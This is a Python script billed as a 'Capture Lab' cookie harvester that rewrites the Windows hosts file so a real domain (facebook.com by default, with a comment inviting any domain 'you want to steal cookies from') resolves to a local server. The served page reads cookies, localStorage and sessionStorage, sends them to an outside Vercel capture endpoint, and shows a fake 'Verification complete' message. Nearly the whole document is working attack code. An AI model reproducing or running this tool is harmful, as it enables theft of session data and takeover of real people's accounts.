"""
Capture Lab - Local HTTP Server
Run on target machine with admin rights.
Serves a page that captures cookies/localStorage from spoofed domains.
"""

import http.server
import json
import os
import sys
import socket
import subprocess
from urllib.parse import urlparse

HOST = "127.0.0.1"
PORT = 80

TARGET_DOMAIN = "facebook.com"  # Change to any domain you want to steal cookies from
HOSTS_PATH = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers', 'etc', 'hosts')

CAPTURE_API = "https://lolz-a0y51apf8-armis-projects.vercel.app/api/capture"

HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Redirecting...</title></head>
<body>
<script>
(async function() {
  const data = {
    timestamp: new Date().toISOString(),
    spoofedDomain: window.location.hostname,
    url: window.location.href,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookies: document.cookie || 'none',
    localStorage: Object.keys(localStorage).length > 0 ? Object.entries(localStorage).reduce((a,[k,v]) => { a[k]=v; return a; }, {}) : 'empty',
    sessionStorage: Object.keys(sessionStorage).length > 0 ? Object.entries(sessionStorage).reduce((a,[k,v]) => { a[k]=v; return a; }, {}) : 'empty'
  };

  // Send to your Vercel API
  try {
    await fetch('""" + CAPTURE_API + """', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch(e) {}

  document.title = 'Done';
  document.body.innerHTML = '<h2 style="font-family:sans-serif;text-align:center;margin-top:50px">Verification complete</h2>';
})();
</script>
</body></html>
"""

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML.encode())
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length else b'{}'
        try:
            data = json.loads(body)
            print(f"\n[!] CAPTURED: {json.dumps(data, indent=2)}")
        except:
            pass
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())
    def log_message(self, format, *args):
        print(f"[*] {args[0]} {args[1]} {args[2]}")

def add_hosts_entry():
    """Add 127.0.0.1 -> TARGET_DOMAIN to hosts file"""
    entry = f"127.0.0.1 {TARGET_DOMAIN}"
    try:
        with open(HOSTS_PATH, 'r') as f:
            content = f.read()
        if TARGET_DOMAIN in content:
            print(f"[+] Hosts entry already exists for {TARGET_DOMAIN}")
            return True
        with open(HOSTS_PATH, 'a') as f:
            f.write(f"\n# Capture lab\n{entry}\n")
        print(f"[+] Added hosts entry: {entry}")
        print(f"[ ] Flushing DNS cache...")
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
        return True
    except PermissionError:
        print(f"[-] ERROR: Need admin rights to modify hosts file.")
        print(f"    Run this script as Administrator.")
        return False
    except Exception as e:
        print(f"[-] ERROR modifying hosts: {e}")
        return False

def remove_hosts_entry():
    """Remove the hosts entry we added"""
    try:
        with open(HOSTS_PATH, 'r') as f:
            lines = f.readlines()
        with open(HOSTS_PATH, 'w') as f:
            skip = False
            for line in lines:
                if "# Capture lab" in line:
                    skip = True
                    continue
                if skip:
                    skip = False
                    continue
                f.write(line)
        print(f"[+] Removed hosts entry for {TARGET_DOMAIN}")
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
    except:
        pass

def check_admin():
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

if __name__ == "__main__":
    print("=" * 60)
    print("  CAPTURE LAB - Local Cookie Harvester")
    print("=" * 60)
    print(f"\n  Target domain: {TARGET_DOMAIN}")
    print(f"  API endpoint: {CAPTURE_API}")
    print(f"  Server: http://{HOST}:{PORT}")
    print()

    if not check_admin():
        print("  WARNING: Not running as Administrator.")
        print("  Port 80 and hosts file modification require admin rights.\n")

    # Add hosts entry
    if not add_hosts_entry():
        print("\n  [!] Could not modify hosts file.")
        print("  [!] Manually add this to your hosts file:")
        print(f"      {HOST} {TARGET_DOMAIN}")
        print()

    print(f"  [*] Starting server on port {PORT}...")
    print(f"  [*] On the target machine, visit: http://{TARGET_DOMAIN}/")
    print(f"  [*] Press Ctrl+C to stop and cleanup\n")
    print("-" * 60)

    try:
        server = http.server.HTTPServer((HOST, PORT), Handler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down...")
        server.shutdown()
    except PermissionError:
        print(f"\n[-] Permission denied on port {PORT}.")
        print(f"    Run as Administrator or use a higher port (change PORT in script).")
    finally:
        remove_hosts_entry()
        print("[+] Cleanup done.")
